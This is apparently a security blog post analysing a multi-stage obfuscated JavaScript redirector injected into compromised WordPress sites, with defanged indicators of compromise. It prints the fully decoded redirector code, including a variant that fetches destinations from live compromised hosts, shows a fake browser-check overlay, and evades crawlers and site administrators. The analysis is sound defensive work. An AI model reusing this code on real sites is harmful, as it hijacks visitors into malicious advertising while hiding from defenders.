---
layout: post
title: "Analysis of compromised WordPress sites with a javascript redirector"
description: "Analysis of compromised WordPress sites with a javascript redirector"
category: analysis, javascript, obfuscation, deobfuscation, advertising
tags: [analysis, javascript, obfuscation, deobfuscation, advertising]
---

Another day, another compromised web sites.
In the last couple of days I've come across a few compromised wordpress sites which are being used for advertising redirects.
What's interesting is that the original payload is not very covert.
When viewing the source for the websites there is a large javascript blob embedded half way through the page.
Unpacking the first stage is quite straight forward. I downloaded the page and modified the javascript as follows

```html
<html>
<head>
</head>
<body>
<script type='text/javascript'>
var BASE64BLOB = atob('AAAAA===');
debugger; //Setup a breakpoint before prompting
eval(BASE64BLOB);
prompt("stage1", BASE64BLOB); //display a prompt where we can copy the deobfuscation
</script>
</body>
</html>
```
This first layer is Nothing special, it's just base64 encoded blob. You could even deobfuscate it using standard commandline tools.
Loading the above page will break just after the initial deobfuscation is complete. 

```html
<html>
<head>
</head>
<body>
<script type='text/javascript'>
var CHARCODEBLOB= String.fromCharCode(40+2,19+22 ... );
debugger; //Setup a breakpoint before prompting
//eval(CHARCODEBLOB);
prompt("stage2", CHARCODEBLOB); //display a prompt where we can copy the deobfuscation
</script>
</body>
</html>
```

The second layer is more of the same, Instead of a base64 encoded blob it's a large block of numbers which will be converted to a characters. The only issue with deobfuscating this by hand is that the numbers which are going to be convert to a character are represented as a sum. It is easier for me to use my strategy from the first layer to view the deobfuscated code.
Unpacking the second layer reveals an interesting third layer where the payload was encoded using a multibyte xor key. Something else that's interesting is that unlike the first two stages, the decoded payload is not executed using an eval but instead a new function. This [stackoverflow](http://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing) post details the differences between the two techniques.
I'll be using the same technique I used for the first two layers to get the final decoded payload.

```html
<html>
<head>
</head>
<body>
<script type='text/javascript'>
var KEY = 'ABCDEFGHIJ';
var ENCODEDBLOB = 'AAAAA===';

function xor_enc(string, key) {
    var res = '';
    for (var i = 0; i < string.length; i++) {
        res += String.fromCharCode(string.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return res;
}
var DECODEDBLOB = xor_enc(atob(ENCODEDBLOG), key);
debugger;
//(new Function(DECODEDBLOB))()
prompt("stage3", DECODEDBLOB);
</script>
</body>
</html>
``` 

The final decoded payload can be found below. I've added comments to explain what the script does.
```javascript
var w_location = '/?pagerd_' + Math.random().toString(36).substring(7);  //Generate a unique URL

function start() {
    var from = document.referrer;
    var i;
    if (checkCookie()) { //Check if the client has visited before and do not have certain wordpress cookies set if they exist then stop
        return;
    }
    var uagent = navigator.userAgent;
    if (!uagent || uagent.length == 0) { //Get the user agent. If there is no useragent then stop
        return;
    }
    uagent = uagent.toLowerCase();
    if (uagent.indexOf('google') != -1 || uagent.indexOf('bot') != -1 || uagent.indexOf('crawl') != -1) {} else { //Check if the client is a bot, crawler etc and if they are stop
        if (window.history && window.history.length > 2) { // Check if the client has a history of 2 or more pages
            window.location = w_location; // Redirect to the generated unique URL
        }
    }

    function getCookie(c_name) {
        var c_value = document.cookie;
        var c_start = c_value.indexOf(" " + c_name + "=");
        if (c_start == -1) {
            c_start = c_value.indexOf(c_name + "=");
        }
        if (c_start == -1) {
            c_value = null;
        } else {
            c_start = c_value.indexOf("=", c_start) + 1;
            var c_end = c_value.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = c_value.length;
            }
            c_value = unescape(c_value.substring(c_start, c_end));
        }
        return c_value;
    }

    function setCookie(c_name, value, exdays) { //Create a cookie with the passed parameters
        var exdate = new Date();
        exdate.setDate(exdate.getDate() + exdays);
        var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
        document.cookie = c_name + "=" + c_value;
    }

    function checkCookie() {
        if (localStorage.getItem('yYjra4PCc8kmBHess1ib') === '1') { //Check if a local storage object named yYjra4PCc8kmBHess1ib exists with the value 1
            return true;
        } else {
            localStorage.setItem('yYjra4PCc8kmBHess1ib', '1'); //Create the local storage object if it does not exist
        }
        var referrerRedirectCookie = getCookie("referrerRedirectCookie");
        if (referrerRedirectCookie != null && referrerRedirectCookie != "") { //If the referrerRedirectCookie does not exist return true
            return true;
        } else if (document.cookie.indexOf('wordpress_logged') !== -1 || document.cookie.indexOf('wp-settings') !== -1 || document.cookie.indexOf('wordpress_test') !== -1) { //If certain wordpress cookies do not exist return true
            return true;
        } else {
            setCookie("referrerRedirectCookie", "do not redirect", 730); //If everything else fails, set the referrerRedirectCookie cookie for 2 years
            return false;
        }
    }
}
var readyStateCheckInterval = setInterval(function() {
    if (document.readyState === 'complete' || document.readyState == 'interactive') {
        clearInterval(readyStateCheckInterval);
        start();
    }
}, 10)
```

I came across another variant of the final payload. There are some minor differences but is functional similar

```javascript
var w_location = null;
var domains = ['http://kntsv.nl/images/tmp.php', 'http://grimhoj.dmcu.dk/modules/mod_xsystem/tmp.php', 'http://langedijke.nl/plugins/tmp.php', 'http://megateuf.edelo.net/cgi-bin/tmp.php', 'http://www.icanguri.com/modules/mod_xsystem/tmp.php', 'http://www.pflege-tut-gut.de/wp-content/plugins/tv1/tmp.php', 'http://yofeet.com/drupal/modules/tmp.php', 'http://squash-moyennedurance.fr/modules/mod_xsystem/tmp.php', 'http://www.devonportmotors.co.nz/images/tmp.php']; //Array of sites which will return the final advertising page

function getDomainName(domain) { //Perform a GET request to the passed variable and save the returned content to w_location
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            if (xhr.responseText && xhr.responseText.trim().length > 0) {
                w_location = xhr.responseText.trim();
            }
        }
    };
    xhr.open('GET', domain, true);
    xhr.send();
}
for (var i = 0; i < domains.length; i++) { //Loop over the list of domains to find a final advertsing page
    getDomainName(domains[i]);
}

function start() {
    var from = document.referrer; //Strangely the author did not use the variables set in the next four lines
    var i; // If it's direct <- //This is an original comment left by the author
    var eee = ["", " "];
    var se = ["google", "yahoo", "bing", "yandex", "baidu", "gigablast", "soso", "blekko", "exalead", "sogou", "duckduckgo", "volunia", "sucuri"]; //This appears to be a list of blacklisted useragents
    if (checkCookie()) {
        return;
    }
    var uagent = navigator.userAgent;
    if (!uagent || uagent.length == 0) { //Read the useragent, if not end
        return;
    }
    uagent = uagent.toLowerCase();
    if (uagent.indexOf('google') != -1 || uagent.indexOf('bot') != -1 || uagent.indexOf('crawl') != -1) {} else { //Check if the client is a bot or a crawler
        hideWebSite();
    }

    function getCookie(c_name) {
        var c_value = document.cookie;
        var c_start = c_value.indexOf(" " + c_name + "=");
        if (c_start == -1) {
            c_start = c_value.indexOf(c_name + "=");
        }
        if (c_start == -1) {
            c_value = null;
        } else {
            c_start = c_value.indexOf("=", c_start) + 1;
            var c_end = c_value.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = c_value.length;
            }
            c_value = unescape(c_value.substring(c_start, c_end));
        }
        return c_value;
    }

    function setCookie(c_name, value, exdays) { //Create a cookie with the passed parameters
        var exdate = new Date();
        exdate.setDate(exdate.getDate() + exdays);
        var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
        document.cookie = c_name + "=" + c_value;
    }

    function checkCookie() {
        if (localStorage.getItem('yYjra4PCc8kmBHess1ib') === '1') { //Check if a local storage object named yYjra4PCc8kmBHess1ib exists with the value 1
            return true;
        } else {
            localStorage.setItem('yYjra4PCc8kmBHess1ib', '1'); //Create the local storage object if it does not exist
        }
        var referrerRedirectCookie = getCookie("referrerRedirectCookie");
        if (referrerRedirectCookie != null && referrerRedirectCookie != "") { //If the referrerRedirectCookie does not exist return true
            return true;
        } else if (document.cookie.indexOf('wordpress_logged') !== -1 || document.cookie.indexOf('wp-settings') !== -1 || document.cookie.indexOf('wordpress_test') !== -1) {
            return true;
        } else {
            setCookie("referrerRedirectCookie", "do not redirect", 730); //If everything else fails, set the referrerRedirectCookie cookie for 2 years
            return false;
        }
    }
}

function createPopup() { //Create a popup which will redirect the user to the advertising
    var popup = document.createElement('div');
    popup.style.position = 'absolute';
    popup.style.width = '100%';
    popup.style.height = '100%';
    popup.style.left = 0;
    popup.style.top = 0;
    popup.style.backgroundColor = 'white';
    popup.style.zIndex = 99999;
    document.body.appendChild(popup);
    popup.onclick = function() {
        var intervalId = setInterval(() => {
            if (!w_location) {
                return;
            }
            clearInterval(intervalId);
            window.location = w_location;
        }, 10);
    };
    var p = document.createElement('p');
    p.innerText = "Checking your browser before accessing " + window.location.host + "...";
    p.style.textAlign = 'center';
    //p.style.margin = '20px auto'; <- authors original comments
    //p.style.left = '20px'; <- authors original comments
    p.style.fontSize = 'x-large';
    p.style.position = 'relative';
    p.textContent = p.innerText;
    popup.appendChild(p);
    return popup;
}

function createButton() { //Create a popup which will redirect the user to the advertising
    var button = document.createElement('div');
    button.style.position = 'absolute';
    button.style.top = '20%';
    button.style.left = '10%';
    button.style.right = '10%';
    button.style.width = '80%';
    button.style.border = "1px solid black";
    button.style.textAlign = 'center';
    button.style.verticalAlign = 'middle';
    button.style.margin = '0, auto';
    button.style.cursor = 'pointer';
    button.style.fontSize = 'xx-large';
    button.style.borderRadius = '5px';
    button.onclick = function() {
        window.location = w_location;
    };
    button.onmouseover = function() {
        button.style.border = '1px solid red';
        button.style.color = 'red';
    };
    button.onmouseout = function() {
        button.style.border = '1px solid black';
        button.style.color = 'black';
    };
    button.innerText = "Continue";
    button.textContent = button.innerText;
    return button;
}
var hideWebSite = function() {
    var popup = createPopup();
    var button = createButton();
    popup.appendChild(button);
};
var readyStateCheckInterval = setInterval(function() {
    if (document.readyState === 'complete' || document.readyState == 'interactive') {
        clearInterval(readyStateCheckInterval);
        start();
    }
}, 10);
```
Browsing to the generated URL redirects you to a page displaying advertising.
It appears they are compromising WordPress sites and embedded the redirector script.
In one of the final payloads, they are fetching the final advertising from a different compromised web servers.
These compromised web servers appear to be running WordPress or another CMS.
What's interesting is the use of multiple different sites to ensure resiliance against takedown efforts and to be able to control the final advertising.
At the time of writing the URL that the redirector is redirecting to is hxxp://jackydallas[.]com/css/

## Indicators:
### Domains:
* kntsv[.]nl
* grimhoj[.]dmcu[.]dk
* langedijke[.]nl
* megateuf[.]edelo[.]net
* www[.]icanguri[.]com
* www[.]pflege-tut-gut[.]de
* yofeet[.]com
* squash-moyennedurance[.]fr
* www[.]devonportmotors[.]co[.]nz

### URLs:
* hxxp://kntsv[.]nl/images/tmp.php
* hxxp://grimhoj[.]dmcu[.]dk/modules/mod_xsystem/tmp.php
* hxxp://langedijke[.]nl/plugins/tmp.php
* hxxp://megateuf[.]edelo[.]net/cgi-bin/tmp.php
* hxxp://www[.]icanguri[.]com/modules/mod_xsystem/tmp.php
* hxxp://www[.]pflege-tut-gut[.]de/wp-content/plugins/tv1/tmp.php
* hxxp://yofeet[.]com/drupal/modules/tmp.php
* hxxp://squash-moyennedurance[.]fr/modules/mod_xsystem/tmp.php
* hxxp://www[.]devonportmotors[.]co[.]nz/images/tmp.php
* hxxp://jackydallas[.]com/css/
